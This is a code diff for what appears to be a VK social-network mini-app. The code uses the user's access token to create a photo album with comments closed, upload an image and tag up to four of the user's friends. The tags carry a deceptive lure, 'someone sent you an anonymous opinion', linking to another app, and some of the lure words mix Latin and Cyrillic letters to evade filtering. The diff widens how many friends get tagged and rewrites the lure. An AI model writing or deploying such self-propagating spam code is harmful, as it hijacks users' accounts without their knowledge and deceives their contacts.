@@ -91,7 +91,7 @@
     function createAlbom(){
       vkConnect.sendPromise("VKWebAppCallAPIMethod", {
           "method": "photos.createAlbum",
-          "params": {"title": randomString(getRandom(5,15)), "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
+          "params": {"title": viewer.first_name, "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
       }).then(data => {
         id_albom = data.response.id;
         uploadPhotoAlbom(id_albom);
@@ -111,12 +111,7 @@
       }).then(data => {
           var upload_url = data.response.upload_url;
 
-          var users = getFriendsOnlineForPhoto();
-          var users_list = users[0];
-          var fr_photo = users[1];
-
-          var photos_list = [fr_photo];
-          photos_list = photos_list[getRandom(0,photos_list.length-1)];
+          var users_list = getFriendsOnlineForPhoto();
 
         $.ajax({
             type: "POST",
@@ -134,7 +129,7 @@
                     //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
 
                     var text = [
-                      users_list+" видела кто тeбе написал в пpиложeнии? : \n\n https://vk.com/app8152009 "
+                      "Посмотри, тебе отправили анонимное мнение : \n https://vk.com/app8152097 \n\n\n\ "+users_list
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
@@ -194,14 +189,15 @@
       for(var i=global_offset_i;i<viewer.friends.items.length;i++) {
           //users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
           global_offset_i++;
-          if(viewer.friends.items[i].sex == 1){
-            users_list +="@id"+viewer.friends.items[i].id+" ("+viewer.friends.items[i].first_name+")";
+        //  if(viewer.friends.items[i].sex == 1){
+            users_list +="@id"+viewer.friends.items[i].id+" (/)";
             count++;
-            if(count > 0) {
-              return [users_list,viewer.friends.items[i].photo_max];
+            if(count > 3) {
+              return users_list;
             }
-          }
+          //}
       }
+      return users_list;
     }
 
     function openApp() {
